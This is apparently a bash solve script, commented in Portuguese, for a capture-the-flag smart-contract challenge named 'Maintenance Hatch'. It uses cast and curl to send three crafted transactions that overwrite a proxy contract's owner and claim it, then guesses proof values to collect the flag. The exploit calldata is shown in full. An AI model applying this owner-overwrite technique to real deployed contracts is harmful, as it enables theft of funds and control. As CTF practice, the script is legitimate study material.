#!/usr/bin/env bash
# Maintenance Hatch (<HOST>) — solve + flag numa sessão só, usando cast + curl.
# Uso: confira COOKIE abaixo (hik_team do navegador), depois:  bash solve.sh
set -u

CAST="${CAST:-$HOME/.config/.foundry/bin/cast}"
RPC="<HOST>"
BASE="<HOST>"
COOKIE="hik_team=<COOKIE>"        # <-- ATUALIZE se mudou no navegador

j() { python3 -c "import sys,json;print(json.load(sys.stdin)$1)"; }

# 1) instância atual do cookie (NÃO rotaciona pq manda o cookie)
INST=$(curl -s -H "Cookie: $COOKIE" "$BASE/instance.json")
SETUP=$(printf '%s' "$INST" | j "['contracts']['setup']")
PLAYER=$(printf '%s' "$INST" | j "['player']")
PK=$(printf '%s' "$INST" | j "['playerPrivateKey']")
A2=0x$($CAST call $SETUP 0xec556889 --rpc-url $RPC | cut -c27-)   # challenge()/target
A1=0x$($CAST call $A2    0x5c60da1b --rpc-url $RPC | cut -c27-)   # implementation()
PLAYER_ID=$(printf '%s' "$INST" | j "['playerId']")
echo "playerId=$PLAYER_ID setup=$SETUP"
echo "A2(target)=$A2 A1(hatch)=$A1"

# 2) resolve (3 txs)
echo "resolvendo..."
P=${PLAYER:2}
$CAST send $A2 0x20c69c890000000000000000000000000000000000000000000000000000000000000001 --rpc-url $RPC --private-key $PK >/dev/null 2>&1 && echo "  arm ok"
$CAST send $A2 0xf83ba31c000000000000000000000000${P,,} --rpc-url $RPC --private-key $PK >/dev/null 2>&1 && echo "  owner-overwrite ok"
$CAST send $A2 0x2f2ec7fe --rpc-url $RPC --private-key $PK >/dev/null 2>&1 && echo "  claim ok"

ISSOLVED=$($CAST call $SETUP "isSolved()(bool)" --rpc-url $RPC)
echo "isSolved=$ISSOLVED"

# 3) flag — proof = valor cru (SEM sha256 extra). token = sha256("ticket:proof")
try_flag () {
  local LABEL="$1" PROOF="$2"
  local TICKET=$(curl -s -H "Cookie: $COOKIE" "$BASE/ticket" | j "['ticket']")
  local TOKEN=$(printf '%s' "${TICKET}:${PROOF}" | sha256sum | cut -d' ' -f1)
  local RESP=$(curl -s -H "Cookie: $COOKIE" -H 'Content-Type: application/json' \
       -d "{\"ticket\":\"$TICKET\",\"token\":\"$TOKEN\"}" "$BASE/flag")
  echo "[$LABEL] proof=$PROOF -> $RESP"
  case "$RESP" in *HIK_*|*'"flag"'*) return 0;; esac
  return 1
}

if [ "$ISSOLVED" = "true" ]; then
  # candidatos: endereços lowercase sem 0x (spec: "no 0x for addresses"), + privkey
  PL=${PLAYER:2}; A2a=${A2:2}; A1a=${A1:2}; SET=${SETUP:2}; PKr=${PK:2}
  try_flag "player"    "${PL,,}"  && exit 0
  try_flag "A2_target" "${A2a,,}" && exit 0
  try_flag "setup"     "${SET,,}" && exit 0
  try_flag "A1_hatch"  "${A1a,,}" && exit 0
  try_flag "privkey"   "${PKr,,}" && exit 0
  echo "Nenhum candidato bateu. proof deve ser outro valor challenge-specific (ver proof table do track)."
else
  echo "NAO resolveu (instancia pode ter resetado). Rode de novo — faz tudo junto."
fi
